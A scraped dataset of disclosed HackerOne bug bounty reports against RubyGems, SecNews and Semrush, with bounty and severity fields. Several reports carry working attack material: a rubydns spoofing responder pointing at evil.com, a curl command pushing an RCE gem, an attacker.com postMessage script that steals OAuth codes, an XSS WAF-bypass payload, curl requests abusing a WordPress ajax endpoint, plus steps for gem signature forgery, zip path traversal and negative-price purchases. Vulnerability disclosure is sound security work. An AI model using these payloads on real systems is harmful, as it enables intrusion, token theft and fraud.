This PoC attempts to replace gems/rack-2.0.3/bin/rackup with a malicious file.
1) Download the attached file replace-rackup.gem.
2) Run gem install rack -v 2.0.3.
3) Run gem install replace-rackup.gem --no-doc.
4) Run rackup.  It will emit just BOOOOM!.
replace-rackup.gem assigns ../gems/rack as name field, and contains a malicious file bin/rackup.  This is really exploitable for attackers.
Note
For how to create the malicious gems, see the attached file src.tar.gz.
In my opinion, this attack is much more dangerous than the issues I reported recently.  I hope you could fix this issue ASAP.3 attachments:F197576: src.tar.gzF197577: create-file.gemF197578: replace-rackup.gem",https://hackerone.com/reports/243156,No value,No value,No value,2017,6,26,9,14
RubyGems,1-10,1.0,No value,"$1,500.00",Critical,9.5,Deserialization of Untrusted Data,Remote code execution on rubygems.org,"max  submitted a report to RubyGems.Oct 6th (5 years ago)When parsing a gem POSTed to the /api/v1/gems endpoint, the rubygems.org application immediately calls Gem::Package.new(body).spec inside app/models/pusher.rb. The authors of the application correctly observed that parsing untrusted YAML is dangerous (since it can serialize more or less arbitrary objects), so they monkey-patched the spec parser to use Psych.safe_load set from config/initializers/forbidden_yaml.rb.
However, YAML.load is called directly when parsing the gem's checksum file in Gem::Package#read_checksums. Using classes accessible within the application, I was able to turn this into a call to Marshal.load on attacker-controlled data. From there, I was able to use known Marshal exploitation techniques to achieve code execution on the server (I'm omitting some details here for brevity so that I can submit this report right away).
A proof of concept, poc.gem, is attached. Run the exploit with the following command:
cat poc.gem | curl -H 'Content-Type: application/gzip' --data-binary @- -H 'Authorization: █████' https://rubygems.org/api/v1/gems
I ran the attached PoC twice. It just does a wget to my server.
Please let me know if I should clarify anything! Thanks for running this program.",https://hackerone.com/reports/274990,No value,No value,No value,2017,10,6,8,49
RubyGems,1-10,1.0,No value,"$1,500.00",No value,0.0,None,Request Hijacking Vulnerability In RubyGems 2.4.6 And Earlier,"claudijd  submitted a report to RubyGems.May 6th (8 years ago)https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)The Internet Bug Bounty  rewarded claudijd with a $1,500 bounty. Dec 7th (7 years ago)",https://hackerone.com/reports/103993,No value,No value,No value,2015,5,6,0,0
RubyGems,1-10,1.0,No value,"$1,000.00",High,7.95,Code Injection,Request Hijacking Vulnerability in RubyGems 2.6.11 and earlier,"claudijd  submitted a report to RubyGems.Apr 2nd (6 years ago)Description:
The RubyGems client supports a gem server API discovery functionality,
which is used when pushing or pulling gems to a gem distribution/hosting
server, like RubyGems.org.  This functionality is provided via a SRV DNS
request to the users gem source hostname prepended with ""_rubygems._tcp."".
The response to this request tells the RubyGems client (aka: the gem
command) where the users gem server API is.  In the default RubyGems
scenario, with a gem source of https://rubygems.org, the users SRV DNS
request and reply will look like this:
    ~ $ dig srv _rubygems._tcp.rubygems.org +short
0 1 80 api.rubygems.org.
Due to a deficiency in DNS response verification, a MiTM positioned
attacker can poison the DNS response to this record response and force
the client to unknowingly download and install Ruby gems from an attacker
controlled gem server in an alternate security domain.  An example of
such a scenario would look like so:
    ~ $ dig _rubygems._tcp.rubygems.org SRV +short
0 0 53 evil.com/api.rubygems.com.
In such a scenario, the attacker is able to serve the client malicious gem
content, resulting in trivial remote code execution scenarios.  For
example, the attacker could simply modify the gem source code and trigger
code execution via the extensions API at install time on the client machine
(a gem trojaning technique described by Ben Smith in his ""Hacking with
Gems"" presentation at Aloha Ruby Conference in 2012 -
https://www.youtube.com/watch?v=z-5bO0Q1J9s)/
This vulnerability has the same net effect/impact as CVE-2015-3900 and
CVE-2015-4020.
Affected method in Gem::RemoteFetcher:
https://github.com/rubygems/rubygems/blob/5096fa35c1ca3e0a7d175aaf9d77cd93114fd977/lib/rubygems/remote_fetcher.rb#L101-L119
PoC DNS SRV Responder:
!/usr/bin/env ruby
    require 'rubydns'
require 'rubydns/system'
INTERFACES = [
[:udp, ""0.0.0.0"", 53],
[:tcp, ""0.0.0.0"", 53]
]
Name = Resolv::DNS::Name
IN = Resolv::DNS::Resource::IN
RubyDNS::run_server(:listen => INTERFACES) do
match(//, IN::SRV) do |transaction|
transaction.respond!(0,0,53,""evil.com/api.rubygems.com"")
end
end
Recommendations:
Consider this small patch to address the immediate attack vector...

     if /.#{Regexp.quote(host)}\z/ =~ target


     if (/.#{Regexp.quote(host)}\z/ =~ target) && !target.include?(""/"")

Also, consider moving away from doing API discovery via DNS.  Would recommend
moving to HTTPS, where you will have a stronger transport security chain.
References (these are not new, just references prior work here to help triage team understand impact):

https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-007/?fid=6356
https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-009/?fid=6478
https://speakerdeck.com/claudijd/trojaned-gems-you-cant-tell-youre-using-one
http://blog.rubygems.org/2015/05/14/CVE-2015-3900.html",https://hackerone.com/reports/218088,No value,No value,No value,2017,4,2,17,31
RubyGems,1-10,1.0,No value,"$1,000.00",Medium,5.5,Cryptographic Issues - Generic,Gem signature forgery,"plover  submitted a report to RubyGems.Oct 6th (5 years ago)Summary
Inconsistencies in how gem processes gem files make it possible to reuse a signature from an existing signed gem and apply it to arbitrary contents. The forged gem will install even with -P HighSecurity.
The attached file multi_json-1.12.2.gem is a forged version of the genuine multi_json-1.12.2.gem gem with faked contents (just a single text file called HACKED). Here is how to check it. You must first trust the original developer's public key.
Code 340 BytesWrap lines Copy Download1$ gem --version
22.5.2
3$ wget https://raw.githubusercontent.com/intridea/multi_json/master/certs/rwz.pem
4$ gem cert --add rwz.pem
5Added '/CN=pavel/DC=pravosud/DC=com'
6$ gem install --install-dir install -P HighSecurity multi_json-1.12.2.gem
7Successfully installed multi_json-1.12.2
81 gem installed
9$ ls install/gems/multi_json-1.12.2/
10HACKED
Details
The vulnerability stems from inconsistencies in how gem interprets the entries of the tar container. A tar file may contain multiple entries with the same name. When there are two data.tar.gz entries, for example, gem will honor the second one when verifying the signature, but the first one when installing files. The proof of concept gem uses this trick: it prepends an additional data.tar.gz entry to the genuine multi_json-1.12.2.gem. (The attached forge-gem.sh script was used to make it.)
Code 475 BytesWrap lines Copy Download1$ tar tvf multi_json-1.12.2.gem
2-r--r--r-- wheel/wheel     163 2017-10-05 16:05 data.tar.gz
3-r--r--r-- wheel/wheel    1840 2017-09-04 21:51 metadata.gz
4-r--r--r-- wheel/wheel     256 2017-09-04 21:51 metadata.gz.sig
5-r--r--r-- wheel/wheel   16908 2017-09-04 21:51 data.tar.gz
6-r--r--r-- wheel/wheel     256 2017-09-04 21:51 data.tar.gz.sig
7-r--r--r-- wheel/wheel     270 2017-09-04 21:51 checksums.yaml.gz
8-r--r--r-- wheel/wheel     256 2017-09-04 21:51 checksums.yaml.gz.sig
A similar bug affects checksums.yaml.gz: checksums are read from the first such entry, while the signature is verified on the last. This table summarizes the inconsistencies:
fileextract_files usesverify usesdata.tar.gzfirstlastchecksums.yaml.gzfirstlastmetadata.gzlastlast
Source code references
Here are the pieces of code that are responsible for the inconsistencies in processing.
extract_files takes the first data.tar.gz entry:
Code 394 BytesWrap lines Copy Download1  def extract_files destination_dir, pattern = ""*""
2    verify unless @spec
3
4    FileUtils.mkdir_p destination_dir
5
6    @gem.with_read_io do |io|
7      reader = Gem::Package::TarReader.new io
8
9      reader.each do |entry|
10        next unless entry.full_name == 'data.tar.gz'
11
12        extract_tar_gz entry, destination_dir, pattern
13
14        return # ignore further entries
15      end
16    end
17  end
read_checksums seeks to the first checksums.yaml.gz entry:
Code 198 BytesWrap lines Copy Download1  def read_checksums gem
2    Gem.load_yaml
3
4    @checksums = gem.seek 'checksums.yaml.gz' do |entry|
5      Zlib::GzipReader.wrap entry do |gz_io|
6        YAML.load gz_io.read
7      end
8    end
9  end
verify_files and verify_entry iterate over all entries in the tar file, filling in @signatures and @digests. In the case of entries with duplicate names, it overwrites previous values, meaning that the last result wins. verify_entry also handles metadata.gz, calling load_spec afresh each time:
Code 542 BytesWrap lines Copy Download1  def verify_entry entry
2    file_name = entry.full_name
3    @files << file_name
4
5    case file_name
6    when /\.sig$/ then
7      @signatures[$`] = entry.read if @security_policy
8      return
9    else
10      digest entry
11    end
12
13    case file_name
14    when /^metadata(.gz)?$/ then
15      load_spec entry
16    when 'data.tar.gz' then
17      verify_gz entry
18    end
19  rescue => e
20    message = ""package is corrupt, exception while verifying: "" +
21              ""#{e.message} (#{e.class})""
22    raise Gem::Package::FormatError.new message, @gem
23  end
verify_checksums and verify_signatures operate only on the precomputed @checksums, @signatures, and @digests.
Incidentally, get_metadata, used by the unpack command, has its own extractor for metadata.gz, but it happens to grab the last entry, just like verify_files.
Mitigation
The attached patch 0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch adds two new tests (both currently failing) that check signature verification when bogus files come before or after the genuine files.
The essential mitigation is to ensure that there is no ambiguity when processing a tar file that has multiple entries for the same file name. E.g., ""data.tar.gz"" must refer to one and only one entry in the tar file. One way to do it would be to set a policy in the code: e.g., last entry always wins (which would be consistent with the tar command). But that would be hard to enforce, especially in new code going forward. Another way would be not to permit duplicate entries; e.g., verify_entry could check whenever it is about to overwrite something in @signatures, @digests, or @spec, and return an error. This needs some care, as metadata and metadata.gz are both processed equivalently. It is possible, using symlinks, to create entries that effectively point to the same file, even though the paths differ; e.g.:
Code 38 BytesWrap lines Copy Download1data.tar.gz
2dir/ -> ..
3dir/data.tar.gz
But this shouldn't be a problem for gem, as long as it continues to use strict string equality with unadorned paths like ""data.tar.gz"".
Even when this bug is fixed, a weaker form of signature forgery is possible. There is nothing in a gem file that binds data.tar.gz and metadata.gz together: they are signed independently. It is possible to mix and match files from different signed gems. Suppose a signed gem example-1.0 has a security vulnerability, and the authors release a new signed update example-1.1. Someone (perhaps a malicious rubygems.org admin) could forge a gem containing data.tar.gz from example-1.0 and metadata.gz from example-1.1. Users would think they are running the updated code, but they are still running the old vulnerable code. Fixing this weaker form of forgery seems like it would require a redesign of the signature format. Ideally, the signature would be over the entire gem, and verified before any unpacking.
It seems that not many people are sign their gems or verify signatures. For most users the possibility of signature forgery doesn't put them at additional risk beyond the (already risky) status quo. The flaw affects only those users who use the MediumSecurity or HighSecurity profiles.
Attachments

multi_json-1.12.2.gem is a gem with a forged signature.
0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patch adds tests for specific instances of gem files that contain multiple entries with the same name.
forge-gem.sh takes an existing signed gem and produces a forged gem containing an arbitrary data.tar.gz file.

How to run forge-gem.sh:
Code 187 BytesWrap lines Copy Download1$ gem fetch multi_json
2$ mkdir orig
3$ mv multi_json-1.12.2.gem orig/
4$ echo hacked > HACKED
5$ tar czf data.tar.gz HACKED
6$ ./forge-gem.sh orig/multi_json-1.12.2.gem data.tar.gz forged.gem
Be aware that if the original multi_json-1.12.2.gem and the new forged.gem are both in the same directory, then gem install ./forged.gem will—for some reason—install multi_json-1.12.2.gem instead. You have to hide the original file in another directory first.3 attachments:F227013: multi_json-1.12.2.gemF227014: 0001-Add-tests-that-Gem-Package-verify-checks-duplicate-f.patchF227015: forge-gem.sh",https://hackerone.com/reports/275269,No value,No value,No value,2017,10,6,23,57
SecNews,11-50,0.0,No value,$300.00,No value,0.0,Privilege Escalation,Querying private posts and changing post meta,"sameoldstory  submitted a report to SecNews.Aug 7th (6 years ago)Summary
Unauthenticated user can run arbitrary post queries and insert arbitrary numeric post meta via vulnerable /wp-content/themes/SecNews-NewCustom/functions/ajax.php file.
I'm including two exploits in one report because the fix for both is the same, i.e. delete ajax.php.
Run arbitrary post queries
Consider this request:
Code 172 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'action=sort&loop=main loop&currentquery[key1]=value1&currentquery[key2]=value2'
It executes a WP_Query against the database with array('key1' => 'value1', 'key2' => 'value2') as the argument.
Attacker can exploit this, for example, to see posts that are scheduled to be published in the future, i.e. posts that are not public yet:
Code 153 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'action=sort&loop=main loop&currentquery[post_status]=future'
For example ""Δείτε τα πιο Geeky Raspberry Pi Smartwatches!"" by Bl4ckPr0xyon will be published on 15.08.2016 at 13:21, i.e. in 8 days from today.
Insert arbitrary numeric post meta
Consider this request:
Code 135 BytesWrap lines Copy Download1curl https://www.secnews.gr/wp-content/themes/SecNews-NewCustom/functions/ajax.php \
2--data 'id=100000&action=rate&meta=test&rating=42'
The request parameters get passed to add_post_meta() function, which inserts a row to the post's meta with an arbitrary key and arbitrary value. The value can only be a number though.
Code 237 BytesWrap lines Copy Download1mysql> select * from wp_postmeta where meta_key = ""test"";
2+---------+----------+------------+
3| post_id | meta_key | meta_value |
4+---------+----------+------------+
5|  100000 | test     | 42         |
6+---------+----------+------------+
This can be used by attacker to alter behavior of plugins and themes. For example:

I removed background image from https://www.secnews.gr/100000 by setting _bg_color_override to 1 in the post meta.
I set shares count to -56994 at https://www.secnews.gr/100000 by changing mashsb_shares and mashsb_timestamp meta of the post.

Potentially this can be used to:

Change booleans, counters and timestamps in other plugins leading to information disclosure or website defacement.
Unnoticeably fill the database with garbage data until the disk space is full.

Affected posts
While looking for vulnerabilities I changed some meta for posts 95513, 100000 and 104030. You can clean it up with something like this:
DELETE * FROM wp_postmeta WHERE post_id IN (95513, 100000, 104030) AND meta_key IN ('_bg_color_override', 'mashsb_shares', 'mashsb_timestamp');",https://hackerone.com/reports/157412,No value,No value,No value,2016,8,7,12,53
Semrush,501-1000,0.0,10m-50m,$650.00,High,7.4,Improper Authentication - Generic,[oauth token leak] at oauth.semrush.com,"nikitastupin  submitted a report to Semrush.Feb 10th (5 years ago)Domain, site, application
oauth.semrush.com
Steps to reproduce
1) Create following html at attacker.com/postmessage.html
Code 404 BytesWrap lines Copy Download1<script>
2  function listener(event) {
3    alert(JSON.stringify(event.data));
4  }
5
6  var dest = window.open(""https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962"");
7  
8  window.addEventListener(""message"", listener);
9</script>
2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)
3) Click ""Approve""
4) Go to tab with attacker.com, you will see alert with code
5) Make POST request with obtained code
Code 512 BytesWrap lines Copy Download1POST /oauth2/access_token HTTP/1.1
2Host: oauth.semrush.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
4Accept: */*
5Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Content-type: application/x-www-form-urlencoded
8Content-Length: 205
9DNT: 1
10Connection: close
11
12client_id=seoquake&client_secret=██████████&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess
6) Receive response with access token and refresh token
Code 363 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Server: nginx
3Content-Type: application/json
4Connection: close
5Cache-Control: no-cache
6Date: Sat, 10 Feb 2018 19:06:38 GMT
7Set-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly
8
9{""access_token"":""███████"",""token_type"":""Bearer"",""expires_in"":604800,""refresh_token"":""kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC""}
Actual results
access token and refresh token of victim:
Code 130 BytesWrap lines Copy Download1{""access_token"":""██████████"",""token_type"":""Bearer"",""expires_in"":604800,""refresh_token"":""kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC""}
PoC, exploit code, screenshots, video, references, additional resources
This vulnerability is possible due to lack of window.opener origin check at https://oauth.semrush.com/oauth2/success:
Code 169 BytesWrap lines Copy Download1<script>
2	if (window.opener && typeof opener.postMessage === 'function') {
3		opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');
4	}
5</script>
Meaning any site that opens https://oauth.semrush.com/oauth2/success may read code in location.href.
Attack vector based on fact that user sees SEOquake authorization page approve.png (F262215) thinking that it's just official application permission request and with high probability clicks ""Approve"".
Still working at vector without this small user interaction.
Impact
OAuth tokens leakage. This leads to user sensitive information leakage.
Note: it's not necessary to install SEOquake plugin!
P.S.
I'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.
I've reported vulnerability as soon as possible therefore no time to deeper scope research.1 attachment:F262215: approve.png",https://hackerone.com/reports/314814,Massachusetts,United States,Boston,2018,2,10,19,34
Semrush,501-1000,0.0,10m-50m,$500.00,Medium,5.45,Path Traversal,Ad Builder Display Ads Path Traversal,"ajxchapman  submitted a report to Semrush.Feb 16th (5 years ago)Summary:
The Semrush Ad Builder for Display Ads is vulnerable to path traversal when extracting zip files and referencing images from the embedded data.csv file.
Description:
The Semrush Ad Builder for Display Ads allows users to import Display Ads from an uploaded zip file. The backend functionality that extracts the uploaded zip file and processes the files contained within is vulnerable to path traversal in multiple places.
Firstly, the zip extractor is vulnerable to path traversal from zip file names, allowing files to be extracted outside of the intended destination directory. Uploaded zip files are extracted to the /█████████/██████████/ab_<api key>_<project id>_displayAds.tmp.unpack destination directory (where <api key> and <project id> are the user's api key and the current project id respectively). If a zip file is extracted which includes a filename with a path traversal specifier (e.g. /../), it will be extracted outside of the intended destination directory.
Example zip file contents and extraction locations:
Code 234 BytesWrap lines Copy Download1Zip file path    Extracted file path
2data.csv      => /██████/█████/ab_███████_1246354_displayAds.tmp.unpack/data.csv
3words.csv     => /████████/████/ab_███_1246354_displayAds.tmp.unpack/words.csv
4../1.png      => /█████████/███/1.png
The full file path of the zip file destination was identified from error messages observed during testing, e.g.:
Code 177 BytesWrap lines Copy Download1{""jsonrpc"":""2.0"",""id"":""1c46d1ff-7327-4be2-8b8f-69c1906fb71c"",""error"":{""code"":-32603,""message"":""mkdir /███████/█████/ab_███_1246354_displayAds.tmp.unpack/link: not a directory""}}
Secondly, the Display Ads file processor is vulnerable to path traversal when processing data.csv files. The Image, Square image, Logo and Landscape logo fields of the data.csv file are all vulnerable to path traversal. Including an Image path with path traversal specifiers allows us to reference images which already exist on the Ad Builder system. For example the path ../../../usr/share/pixmaps/debian-logo.png will reference the /usr/share/pixmaps/debian-logo.png image which exists by default on most Debian based systems. This image will be used in the produced advert.
Please note that during testing I have created two files outside of the /████████/█████/ab_█████_1246354_displayAds.tmp.unpack/ folder, /██████/████████/1.png and /█████/███/link. These files should be removed when this issue is confirmed.
Browsers Verified In:

Firefox version 58.0.2 (64-bit)

Steps To Reproduce:

Create a new Semrush project
Select ""Ad Builder"" then ""Display Ads""
Then select ""New Ad"" -> ""From File"" and upload one of the zips attached to this issue
Click through the rest of the wizard
Observe the outcome in the produced advert

See the attached screen capture for a demonstration of this issue.
Supporting Material/References:
Zip file referencing pre existing image outside the zip file (/usr/share/pixmaps/debian-logo.png)
display-ads-deb.zip (Attachment ████████)
Code 293 BytesWrap lines Copy Download1$ zipinfo display-ads-deb.zip
2Archive:  display-ads-deb.zip
3Zip file size: 581 bytes, number of entries: 2
4-rw-r--r--  3.0 unx      432 tx defN 18-Feb-16 07:35 data.csv
5-rw-r--r--  3.0 unx       48 tx stor 18-Feb-15 18:28 words.csv
62 files, 480 bytes uncompressed, 269 bytes compressed:  44.0%
data.csv
Code 431 BytesWrap lines Copy Download1Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
2Enabled,Default campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,,http://semrush.webhooks.pw,,
Uploading this zip file, which contains no images, to the Display Ads Ad Builder will create an advert which references an image that already exists on the system outside the intended destination directory. The referenced image is /usr/share/pixmaps/debian-logo.png which exists by default on most Debian based systems. From this we can infer that the Ad Builder is running some Debian derivative Linux.
Zip file extracting file outside of the intended destination directory (/███/███████/1.png)
display-ads-trav.zip (Attachment ██████)
Code 420 BytesWrap lines Copy Download1$ zipinfo display-ads-trav.zip
2Archive:  display-ads-trav.zip
3Zip file size: 18357 bytes, number of entries: 4
4drwxr-xr-x  3.0 unx        0 bx stor 18-Feb-16 07:37 aa/
5-rw-r--r--  3.0 unx    25650 bx defN 18-Feb-16 07:37 ../1.png
6-rw-r--r--  3.0 unx      306 tx defN 18-Feb-16 07:42 data.csv
7-rw-r--r--  3.0 unx       48 tx stor 18-Feb-15 18:28 words.csv
84 files, 26004 bytes uncompressed, 17767 bytes compressed:  31.7%
data.csv
Code 305 BytesWrap lines Copy Download1Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
2Enabled,Default Campaign,Display Network only,Default Group,Something,Something,Something,Something,,,,,http://semrush.webhooks.pw,,
Uploading this zip file to the Display Ads Ad Builder will place the 1.png image in the /███████/███ directory, which is outside the intended destination directory (/████████/██████████/ab_███_1246354_displayAds.tmp.unpack/). No images are referenced in the created advert.
Zip file referencing created image outside the zip file (/███████/██████/1.png)
display-ads-new.zip (Attachment ███████)
Code 293 BytesWrap lines Copy Download1$ zipinfo display-ads-new.zip
2Archive:  display-ads-new.zip
3Zip file size: 574 bytes, number of entries: 2
4-rw-r--r--  3.0 unx      390 tx defN 18-Feb-16 07:48 data.csv
5-rw-r--r--  3.0 unx       48 tx stor 18-Feb-15 18:28 words.csv
62 files, 438 bytes uncompressed, 262 bytes compressed:  40.2%
data.csv
Code 385 BytesWrap lines Copy Download1Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
2Enabled,Default Campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../██████/█████/1.png,../../../███████/█████/1.png,../../../████/█████/1.png,,http://semrush.webhooks.pw,,
Uploading this zip file, which contains no images, to the Display Ads Ad Builder will create an advert which references the image /████████/████/1.png created by display-ads-trav.zip above.
Impact
These issues can be abused to place arbitrary files in writable directories on the Ad Buider system and infer the existence of █████ious system properties and installed packages (such as Linux flavour, python version, golang version, etc.). 
In the worst case this issue could lead to complete compromise of the Ad Builder system through writing scripts or executables to directories where they will be automatically executed. During testing however, I have been unable to identify any writable directories outside of /███/████████ and it's subdirectories. For this reason I have not included the full system compromise in consideration of the CVSSv3 calculation. However, other writable directories may exist on the system which could increase the impact of this issue significantly.1 attachment:F263911: semrush_displayads.gif",https://hackerone.com/reports/316713,Massachusetts,United States,Boston,2018,2,16,8,24
Semrush,501-1000,0.0,10m-50m,"$2,111.00",High,7.95,Business Logic Errors,An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss,"yashrs  submitted a report to Semrush.Jan 10th (3 years ago)Hi there,
When we
Summary:
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to  negative quantities being allowed. 
Steps To Reproduce:

Go to https://www.semrush.com/marketplace/offers/
Click on 500 Words($40) Order Now button.
Select any two articles.
Intercept the request:

Code 468 BytesWrap lines Copy Download1POST /marketplace/api/purchases/bulk HTTP/1.1
2Host: www.semrush.com
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
4Accept: application/json
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://www.semrush.com/marketplace/offers/
8Content-type: application/json
9Origin: https://www.semrush.com
10Content-Length: 45
11DNT: 1
12Connection: close
13Cookie: COOKIES
14
15{""items"":{""article_500"":1,""article_1000"":1}}

The actual price should be $110 for two articles.

Change the JSON body to :
Code 45 BytesWrap lines Copy Download1{""items"":{""article_500"":4,""article_1000"":-2}}

The cost will become $20 for two articles:
4  $40- 2  $70= $160 - $140 = $20

████
I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
██████████
Regards,
Yash
Impact
An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to SemrushSummary by yashrsThe SEMrush team triaged and patched this issue in less than 24 hours. That's a great turnaround time! It was nice working with the team :)",https://hackerone.com/reports/771694,Massachusetts,United States,Boston,2020,1,10,15,18
Semrush,501-1000,0.0,10m-50m,$350.00,Low,2.0,Cross-site Scripting (XSS) - Reflected,Content Injection on api.semrush.com to Reflected XSS,nikitastupin  submitted a report to Semrush.Dec 5th (3 years ago)Summary by nikitastupinWhile testing api.semrush.com I've found that some inputs triggered MongoDB error on /reports/v1/projects/:id/siteaudit/page/list endpoint. Contents of url parameter was reflected in error message. Unfortunately WAF blocked my XSS attempts. Fuzzing a little bit further I was able to bypass WAF with <object data=javascript:confirm(document.domain)> payload.,https://hackerone.com/reports/752042,Massachusetts,United States,Boston,2019,12,5,15,51
Semrush,501-1000,0.0,10m-50m,"$1,000.00",Medium,5.7,Misconfiguration,Cross-origin resource sharing misconfig | steal user information ,"bughuntermate  submitted a report to Semrush.Jun 1st (5 years ago)Man, treat you another drink.
Description
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.
POC1
Request
Code 1.85 KiBWrap lines Copy Download1GET /organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402 HTTP/1.1
2Host: www.semrush.com
3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
4Accept: application/json, text/javascript, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6Referer: https://www.semrush.com/projects/
7X-Requested-With: XMLHttpRequest
8Cookie: wp13557=""UWYYADs-TTTW:WWLHWYDtlnDl-TJIH-UYUTDDDIALHUZDLZTAHTIV-CCAY-XMLT-IUUA-UYUBWXWZACCWDlLtkNlo_Jht""; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%2C%22db%22%3A%22sg%22%7D; db_date=current; userdata=%7B%22tz%22%3A%22GMT+8%22%2C%22ol%22%3A%22en%22%7D; _ga=GA1.2.412244322.1496213122; _gid=GA1.2.1937633003.1496213122; visit_first=1496213122000; __uvt=; uvts=65OAcWY4QhJHESTs; referer_purchase=https%3A%2F%2Fes.semrush.com%2Fdashboard%2F; sct:feedback:show=false; __insp_uid=2126149429; temp_db_but=sg; db=us; exp_feature_popup_closed=yes; about_sessionid=gue5yj2t8bmucnlwuv1y1cxilq7a7q8g; about_csrf=i6C8isOR7WLuVa1348FSsPH6rXzVEQSr; n_userid=LuWhoFku7Ou4q2PeBHIUAg==; __zlcmid=gngUE7HFajaRsy; _bizo_bzid=ec0d2554-575b-420b-b404-51b70939ec49; _bizo_cksm=34222E182676EC07; _bizo_np_stats=155%3D338%2C; auth_token=CMFMT27JhWR9cnbkoV1dHvFaxc4tQ3f0B4IAw5BfTOjyeKeF9FKx8w2kpiLl; __insp_wid=1632961932; __insp_slim=1496248714271; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vcHJvamVjdHMvIzgwMDEyMi92aWV3Lw%3D%3D; __insp_targlpt=U0VNcnVzaA%3D%3D; __insp_norec_howoften=true; __insp_norec_sess=true; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en; connect.sid=s%253A4cV9yXJcfQFXmC65JJn3KSP6Wp184s10.vGOEA1%252BgVTXbwDY4YSOkOjjnteLNyifmcQdJh8XZckI; _gat=1; _uetsid=_uetd1ba382c; JSESSIONID=4423D9EF5D5BEE794094AC0713E9EE8E; _gat_UA-6197637-22=1
9Connection: close
10Origin: https://itqayzlbkshw.com
Response
Code 1.22 KiBWrap lines Copy Download1HTTP/1.1 200 
2Server: nginx
3Date: Thu, 01 Jun 2017 01:36:26 GMT
4Content-Type: application/json;charset=UTF-8
5Content-Length: 884
6Connection: close
7Access-Control-Allow-Origin: https://itqayzlbkshw.com
8Vary: Origin
9Access-Control-Allow-Credentials: true
10X-XSS-Protection: 1; mode=block
11X-Content-Type-Options: nosniff
12Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
13X-Frame-Options: SAMEORIGIN
14
15[{""key"":""███"",""projectId"":""800122"",""projectName"":""dfsfsda"",""status"":""NOT_AUTHORISED"",""authoriseUrl"":""https://accounts.google.com/o/oauth2/auth?access_type=offline&approval_prompt=force&client_id=1093302022032-p190dsgnrdoavgstsem5i2pom6t9il6r.apps.googleusercontent.com&redirect_uri=http://gat.semrush.com/api/rest/1.2/auth&response_type=code&scope=https://www.googleapis.com/auth/analytics.readonly%20https://www.googleapis.com/auth/webmasters.readonly&state=█████████_800122_%5B%22https://www.googleapis.com/auth/analytics.readonly%22,%22https://www.googleapis.com/auth/webmasters.readonly%22%5D"",""email"":null,""accounts"":null,""account"":null,""property"":null,""view"":null,""url"":null,""siteUrls"":null,""siteUrl"":null,""database"":""us"",""device"":""desktop"",""totals"":null,""created"":null,""accountName"":null,""propertyName"":null,""viewName"":null}]
Take note from request I inject a header Origin: https://itqayzlbkshw.com then from response it returns Access-Control-Allow-Origin: https://itqayzlbkshw.com. Which mean there is CORS misconfig here.
